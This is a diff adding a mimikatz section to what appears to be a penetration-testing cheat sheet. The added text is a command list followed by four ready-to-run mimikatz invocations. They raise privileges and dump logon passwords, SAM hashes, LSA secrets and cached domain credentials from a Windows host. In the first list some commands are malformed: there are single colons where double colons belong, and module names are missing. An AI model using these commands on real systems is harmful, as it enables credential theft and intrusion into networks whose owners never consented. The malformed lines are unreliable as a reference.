@@ -3542,3 +3542,35 @@ cd 'path\to\remote\dir'
 lcd '~/path/to/download/to/'
 mget *
 ```
+
+mimikatz commands
+```
+token:elevate
+privilege
+log
+sekurlsa:logonpasswords
+lsadump::sam
+lsadump::secrets
+lsadump::cache
+```
+
+```
+.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
+```
+
+```
+.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
+```
+
+
+```
+.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"
+```
+
+
+```
+.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::cache" "exit"
+```
+
+
+
